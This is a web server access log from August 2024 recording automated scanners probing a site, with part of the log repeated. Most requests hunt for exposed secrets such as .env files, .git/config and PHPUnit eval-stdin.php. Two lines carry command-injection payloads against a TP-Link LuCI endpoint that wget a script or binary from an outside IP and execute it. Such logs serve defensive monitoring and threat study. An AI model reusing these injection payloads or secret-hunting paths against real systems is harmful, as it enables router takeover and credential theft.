102.165.16.250 - - [16/Aug/2024:06:02:19 +0000] "GET /?%3Cplay%3Ewithme%3C/%3E HTTP/1.1" 200 3522 "-" "python-requests/2.31.0"
102.165.16.250 - - [16/Aug/2024:06:02:21 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
102.165.16.250 - - [16/Aug/2024:06:02:21 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
102.165.16.250 - - [16/Aug/2024:06:02:22 +0000] "GET /config.json HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
102.165.16.250 - - [16/Aug/2024:06:02:22 +0000] "GET /.git/config HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
83.97.73.245 - - [16/Aug/2024:06:09:35 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
208.110.70.42 - - [16/Aug/2024:06:25:41 +0000] "GET /restore.php HTTP/1.1" 404 162 "-" "-"
208.110.70.42 - - [16/Aug/2024:06:25:41 +0000] "GET /restore.php HTTP/1.1" 404 162 "-" "-"
52.76.71.100 - - [16/Aug/2024:06:27:37 +0000] "GET /favicon.ico HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
37.114.63.32 - - [16/Aug/2024:06:33:49 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
185.191.126.213 - - [16/Aug/2024:06:33:54 +0000] "GET / HTTP/1.1" 200 10671 "-" "-"
206.168.34.120 - - [16/Aug/2024:06:47:00 +0000] "GET / HTTP/1.1" 400 264 "-" "-"
206.168.34.120 - - [16/Aug/2024:06:47:05 +0000] "GET / HTTP/1.1" 400 264 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.224.128.47 - - [16/Aug/2024:06:57:42 +0000] "GET / HTTP/1.0" 200 10671 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
184.105.139.70 - - [16/Aug/2024:06:58:36 +0000] "GET / HTTP/1.1" 200 405 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
162.142.125.64 - - [16/Aug/2024:07:01:23 +0000] "GET / HTTP/1.1" 200 815 "-" "-"
162.142.125.64 - - [16/Aug/2024:07:01:31 +0000] "GET / HTTP/1.1" 200 405 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.64 - - [16/Aug/2024:07:01:36 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
184.105.139.70 - - [16/Aug/2024:07:03:49 +0000] "GET /webui/ HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
184.105.139.70 - - [16/Aug/2024:07:07:22 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
184.105.139.70 - - [16/Aug/2024:07:08:14 +0000] "GET / HTTP/1.1" 200 405 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
184.105.139.70 - - [16/Aug/2024:07:13:35 +0000] "GET /.git/config HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.156 Not(A:Brand/24 YaBrowser/24.4.1.901 Yowser/2.5  Safari/537.36"
185.191.126.213 - - [16/Aug/2024:07:25:10 +0000] "GET / HTTP/1.1" 200 10671 "-" "-"
162.142.125.64 - - [16/Aug/2024:07:32:05 +0000] "GET / HTTP/1.1" 400 264 "-" "-"
162.142.125.64 - - [16/Aug/2024:07:32:11 +0000] "GET / HTTP/1.1" 400 264 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.224.128.83 - - [16/Aug/2024:07:35:53 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.18.196%2Ft%7Csh%3B%60) HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
154.216.16.80 - - [16/Aug/2024:07:37:52 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
154.216.16.80 - - [16/Aug/2024:07:37:53 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
154.216.16.80 - - [16/Aug/2024:07:39:58 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 134 "-" "python-requests/2.25.1"
92.118.39.167 - - [16/Aug/2024:08:03:16 +0000] "GET /.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.154.33.76 - - [16/Aug/2024:08:21:36 +0000] "GET / HTTP/1.1" 200 405 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
195.154.33.76 - - [16/Aug/2024:08:21:39 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
195.154.33.76 - - [16/Aug/2024:08:25:36 +0000] "GET /HNAP1 HTTP/1.1" 404 197 "https://185.251.38.39:443/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.154.33.76 - - [16/Aug/2024:08:25:39 +0000] "GET /PSIA/index HTTP/1.1" 404 197 "https://185.251.38.39:443/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
78.153.140.177 - - [16/Aug/2024:08:29:47 +0000] "GET /.env HTTP/1.1" 404 162 "-" "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
78.153.140.177 - - [16/Aug/2024:08:29:47 +0000] "GET /.env.example HTTP/1.1" 404 564 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; CLUB PC)"
78.153.140.177 - - [16/Aug/2024:08:29:47 +0000] "GET /.env.production HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; M886 Build/HuaweiM886) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
78.153.140.177 - - [16/Aug/2024:08:29:48 +0000] "GET /.env.prod HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10"
78.153.140.177 - - [16/Aug/2024:08:29:48 +0000] "GET /.env.bak HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.3 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.3"
78.153.140.177 - - [16/Aug/2024:08:29:49 +0000] "GET /public/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62"
78.153.140.177 - - [16/Aug/2024:08:29:49 +0000] "GET /core/.env HTTP/1.1" 404 162 "-" "Opera/9.26 (Windows NT 5.1; U; de)"
78.153.140.177 - - [16/Aug/2024:08:29:49 +0000] "GET /local/.env HTTP/1.1" 404 564 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint;PPC-i830; PPC; 240x320)"
78.153.140.177 - - [16/Aug/2024:08:29:49 +0000] "GET /crm/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36 OPR/16.0.1196.73"
78.153.140.177 - - [16/Aug/2024:08:29:49 +0000] "GET /.env.save HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.2; eu) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4"
78.153.140.177 - - [16/Aug/2024:08:29:50 +0000] "GET /apps/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 OPR/39.0.2256.71"
78.153.140.177 - - [16/Aug/2024:08:29:50 +0000] "GET /database/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Linux; Android 6.0; Lenovo A6600d40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
78.153.140.177 - - [16/Aug/2024:08:29:50 +0000] "GET /.env.local HTTP/1.1" 404 162 "-" "Opera/9.80 (Windows Mobile; WCE; Opera Mobi/WMD-50433; U; en-GB) Presto/2.4.13 Version/10.00"
78.153.140.177 - - [16/Aug/2024:08:29:51 +0000] "GET /config/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17"
78.153.140.177 - - [16/Aug/2024:08:29:52 +0000] "GET /vendor/.env HTTP/1.1" 404 564 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; EIE10;ENUSWOL)"
78.153.140.177 - - [16/Aug/2024:08:29:52 +0000] "GET /.env.dev HTTP/1.1" 404 564 "-" "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Avant Browser; Avant Browser; .NET CLR 1.0.3705; .NET CLR 1.1.4322; Media Center PC 4.0; .NET CLR 2.0.50727; .NET CLR 3.0.04506.30)"
78.153.140.177 - - [16/Aug/2024:08:29:52 +0000] "GET /blog/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:35.0) Gecko/20100101 Firefox/35.0"
78.153.140.177 - - [16/Aug/2024:08:29:52 +0000] "GET /cgi-bin/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.86 Safari/537.36"
78.153.140.177 - - [16/Aug/2024:08:29:53 +0000] "GET /new/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Linux; U; Android 4.3; en-us; SCH-I545 Build/JSS15J) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 Mobile Safari/534.30evme-launcher"
78.153.140.177 - - [16/Aug/2024:08:29:53 +0000] "GET /old/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_0) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.79 Safari/537.4"
78.153.140.177 - - [16/Aug/2024:08:29:53 +0000] "GET /protected/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36 OPR/49.0.2725.56"
78.153.140.177 - - [16/Aug/2024:08:29:54 +0000] "GET /src/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Linux; Android 7.0; SM-G950U Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36"
78.153.140.177 - - [16/Aug/2024:08:29:54 +0000] "GET /storage/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows NT 5.1; rv:53.0) Gecko/20100101 Firefox/53.0"
78.153.140.177 - - [16/Aug/2024:08:29:55 +0000] "GET /.env.backup HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Linux; U; Android 2.3.6; es-us; GT-I9070 Build/GINGERBREAD) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
78.153.140.177 - - [16/Aug/2024:08:29:55 +0000] "GET /.env.stage HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Mobile; LYF/F61F/LYF-F61F-000-01-20-310118; Android; rv:48.0) Gecko/48.0 Firefox/48.0 KAIOS/2.0"
78.153.140.177 - - [16/Aug/2024:08:29:55 +0000] "GET /app/config/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.1; cs; rv:1.8.1.18) Gecko/20081029 Firefox/2.0.0.18"
78.153.140.177 - - [16/Aug/2024:08:29:56 +0000] "GET /application/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X 10_4_11; de) AppleWebKit/528.4+ (KHTML, like Gecko) Version/4.0dp1 Safari/526.11.2"
78.153.140.177 - - [16/Aug/2024:08:29:56 +0000] "GET /.env.live HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.112 Safari/537.36 OPR/36.0.2130.75"
78.153.140.177 - - [16/Aug/2024:08:29:56 +0000] "GET /.env.old HTTP/1.1" 404 564 "-" "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)"
78.153.140.177 - - [16/Aug/2024:08:29:57 +0000] "GET /.env.production.local HTTP/1.1" 404 162 "-" "Opera/9.63 (X11; Linux x86_64; U; cs) Presto/2.1.1"
78.153.140.177 - - [16/Aug/2024:08:29:58 +0000] "GET /.env_1 HTTP/1.1" 404 162 "-" "Mozilla/5.0 (iPad;U;CPU OS 3_2_2 like Mac OS X; en-us) AppleWebKit/531.21.10 (KHTML, like Gecko) Version/4.0.4 Mobile/7B500 Safari/531.21.10"
208.110.70.42 - - [16/Aug/2024:08:40:59 +0000] "GET /restore.php HTTP/1.1" 404 162 "-" "-"
208.110.70.42 - - [16/Aug/2024:08:41:00 +0000] "GET /restore.php HTTP/1.1" 404 162 "-" "-"
157.245.69.32 - - [16/Aug/2024:08:50:42 +0000] "GET /aaa9 HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
157.245.69.32 - - [16/Aug/2024:08:50:45 +0000] "GET /aab8 HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
157.245.69.32 - - [16/Aug/2024:08:50:51 +0000] "GET / HTTP/1.1" 200 3522 "-" "Mozilla/5.0 zgrab/0.x"
185.191.126.213 - - [16/Aug/2024:09:01:17 +0000] "GET / HTTP/1.1" 200 10671 "-" "-"
167.71.110.14 - - [16/Aug/2024:09:02:45 +0000] "GET /squid-internal-mgr/cachemgr.cgi HTTP/1.1" 404 134 "-" "Mozilla/5.0 zgrab/0.x"
167.71.110.14 - - [16/Aug/2024:09:02:50 +0000] "GET /squid-internal-mgr/cachemgr.cgi HTTP/1.1" 400 264 "-" "Mozilla/5.0 zgrab/0.x"
149.50.103.48 - - [16/Aug/2024:09:04:12 +0000] "GET / HTTP/1.1" 200 3522 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
106.75.157.47 - - [16/Aug/2024:09:05:20 +0000] "GET /.vscode/sftp.json HTTP/1.1" 404 134 "-" "Go-http-client/1.1"
154.213.187.96 - - [16/Aug/2024:09:34:18 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60cd+%2Ftmp%3B+rm+-rf+r%3B+wget+http%3A%2F%2F45.66.231.213%2Fr%3B+chmod+777+r%3B+.%2Fr+tplink%3B+rm+-rf+r%60) HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
43.153.110.177 - - [16/Aug/2024:09:41:57 +0000] "GET / HTTP/1.1" 301 178 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
43.153.110.177 - - [16/Aug/2024:09:41:58 +0000] "GET / HTTP/1.1" 200 405 "http://www.musiify.site" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
102.165.16.250 - - [16/Aug/2024:06:02:19 +0000] "GET /?%3Cplay%3Ewithme%3C/%3E HTTP/1.1" 200 3522 "-" "python-requests/2.31.0"
102.165.16.250 - - [16/Aug/2024:06:02:21 +0000] "GET /_profiler/phpinfo HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
102.165.16.250 - - [16/Aug/2024:06:02:21 +0000] "GET /debug/default/view?panel=config HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
102.165.16.250 - - [16/Aug/2024:06:02:22 +0000] "GET /config.json HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
102.165.16.250 - - [16/Aug/2024:06:02:22 +0000] "GET /.git/config HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
83.97.73.245 - - [16/Aug/2024:06:09:35 +0000] "GET /actuator/gateway/routes HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
208.110.70.42 - - [16/Aug/2024:06:25:41 +0000] "GET /restore.php HTTP/1.1" 404 162 "-" "-"
208.110.70.42 - - [16/Aug/2024:06:25:41 +0000] "GET /restore.php HTTP/1.1" 404 162 "-" "-"
52.76.71.100 - - [16/Aug/2024:06:27:37 +0000] "GET /favicon.ico HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
37.114.63.32 - - [16/Aug/2024:06:33:49 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0"
185.191.126.213 - - [16/Aug/2024:06:33:54 +0000] "GET / HTTP/1.1" 200 10671 "-" "-"
206.168.34.120 - - [16/Aug/2024:06:47:00 +0000] "GET / HTTP/1.1" 400 264 "-" "-"
206.168.34.120 - - [16/Aug/2024:06:47:05 +0000] "GET / HTTP/1.1" 400 264 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.224.128.47 - - [16/Aug/2024:06:57:42 +0000] "GET / HTTP/1.0" 200 10671 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
184.105.139.70 - - [16/Aug/2024:06:58:36 +0000] "GET / HTTP/1.1" 200 405 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
162.142.125.64 - - [16/Aug/2024:07:01:23 +0000] "GET / HTTP/1.1" 200 815 "-" "-"
162.142.125.64 - - [16/Aug/2024:07:01:31 +0000] "GET / HTTP/1.1" 200 405 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
162.142.125.64 - - [16/Aug/2024:07:01:36 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
184.105.139.70 - - [16/Aug/2024:07:03:49 +0000] "GET /webui/ HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Safari/605.1.15"
184.105.139.70 - - [16/Aug/2024:07:07:22 +0000] "GET /favicon.ico HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:102.0) Gecko/20100101 Firefox/102.0"
184.105.139.70 - - [16/Aug/2024:07:08:14 +0000] "GET / HTTP/1.1" 200 405 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0"
184.105.139.70 - - [16/Aug/2024:07:13:35 +0000] "GET /.git/config HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 6.1; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.6261.156 Not(A:Brand/24 YaBrowser/24.4.1.901 Yowser/2.5  Safari/537.36"
185.191.126.213 - - [16/Aug/2024:07:25:10 +0000] "GET / HTTP/1.1" 200 10671 "-" "-"
162.142.125.64 - - [16/Aug/2024:07:32:05 +0000] "GET / HTTP/1.1" 400 264 "-" "-"
162.142.125.64 - - [16/Aug/2024:07:32:11 +0000] "GET / HTTP/1.1" 400 264 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
185.224.128.83 - - [16/Aug/2024:07:35:53 +0000] "GET /cgi-bin/luci/;stok=/locale?form=country&operation=write&country=$(id%3E%60wget+-O-+http%3A%2F%2F154.216.18.196%2Ft%7Csh%3B%60) HTTP/1.1" 404 162 "-" "Go-http-client/1.1"
154.216.16.80 - - [16/Aug/2024:07:37:52 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
154.216.16.80 - - [16/Aug/2024:07:37:53 +0000] "GET /.env HTTP/1.1" 404 134 "-" "Mozilla/5.0 (Linux; U; Android 4.4.2; en-US; HM NOTE 1W Build/KOT49H) AppleWebKit/534.30 (KHTML, like Gecko) Version/4.0 UCBrowser/11.0.5.850 U3/0.8.0 Mobile Safari/534.30"
154.216.16.80 - - [16/Aug/2024:07:39:58 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 134 "-" "python-requests/2.25.1"
92.118.39.167 - - [16/Aug/2024:08:03:16 +0000] "GET /.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
195.154.33.76 - - [16/Aug/2024:08:21:36 +0000] "GET / HTTP/1.1" 200 405 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
195.154.33.76 - - [16/Aug/2024:08:21:39 +0000] "GET /favicon.ico HTTP/1.1" 404 197 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36"
195.154.33.76 - - [16/Aug/2024:08:25:36 +0000] "GET /HNAP1 HTTP/1.1" 404 197 "https://185.251.38.39:443/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
195.154.33.76 - - [16/Aug/2024:08:25:39 +0000] "GET /PSIA/index HTTP/1.1" 404 197 "https://185.251.38.39:443/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
78.153.140.177 - - [16/Aug/2024:08:29:47 +0000] "GET /.env HTTP/1.1" 404 162 "-" "SonyEricssonW580i/R6BC Browser/NetFront/3.3 Profile/MIDP-2.0 Configuration/CLDC-1.1"
78.153.140.177 - - [16/Aug/2024:08:29:47 +0000] "GET /.env.example HTTP/1.1" 404 564 "-" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; CLUB PC)"
78.153.140.177 - - [16/Aug/2024:08:29:47 +0000] "GET /.env.production HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; M886 Build/HuaweiM886) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1"
78.153.140.177 - - [16/Aug/2024:08:29:48 +0000] "GET /.env.prod HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Macintosh; U; PPC Mac OS X; fr-fr) AppleWebKit/523.10.3 (KHTML, like Gecko) Version/3.0.4 Safari/523.10"
78.153.140.177 - - [16/Aug/2024:08:29:48 +0000] "GET /.env.bak HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/602.4.3 (KHTML, like Gecko) Version/10.0.3 Safari/602.4.3"
78.153.140.177 - - [16/Aug/2024:08:29:49 +0000] "GET /public/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.101 Safari/537.36 OPR/40.0.2308.62"
78.153.140.177 - - [16/Aug/2024:08:29:49 +0000] "GET /core/.env HTTP/1.1" 404 162 "-" "Opera/9.26 (Windows NT 5.1; U; de)"
78.153.140.177 - - [16/Aug/2024:08:29:49 +0000] "GET /local/.env HTTP/1.1" 404 564 "-" "Mozilla/4.0 (compatible; MSIE 4.01; Windows CE; Sprint;PPC-i830; PPC; 240x320)"
78.153.140.177 - - [16/Aug/2024:08:29:49 +0000] "GET /crm/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/29.0.1547.57 Safari/537.36 OPR/16.0.1196.73"
78.153.140.177 - - [16/Aug/2024:08:29:49 +0000] "GET /.env.save HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows; U; Windows NT 5.2; eu) AppleWebKit/530.4 (KHTML, like Gecko) Chrome/2.0.172.0 Safari/530.4"
78.153.140.177 - - [16/Aug/2024:08:29:50 +0000] "GET /apps/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 OPR/39.0.2256.71"
78.153.140.177 - - [16/Aug/2024:08:29:50 +0000] "GET /database/.env HTTP/1.1" 404 564 "-" "Mozilla/5.0 (Linux; Android 6.0; Lenovo A6600d40 Build/MRA58K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.81 Mobile Safari/537.36"
78.153.140.177 - - [16/Aug/2024:08:29:50 +0000] "GET /.env.local HTTP/1.1" 404 162 "-" "Opera/9.80 (Windows Mobile; WCE; Opera Mobi/WMD-50433; U; en-GB) Presto/2.4.13 Version/10.00"
78.153.140.177 - - [16/Aug/2024:08:29:51 +0000] "GET /config/.env HTTP/1.1" 404 162 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0; pl; rv:1.8.1.17) Gecko/20080829 Firefox/2.0.0.17"
78.153.140.177 - - [16/Aug/2024:08:29:52 +0000] "GET /vendor/.env HTTP/1.1" 404 564 "-" "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.5; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; Tablet PC 2.0; EIE10;ENUSWOL)"
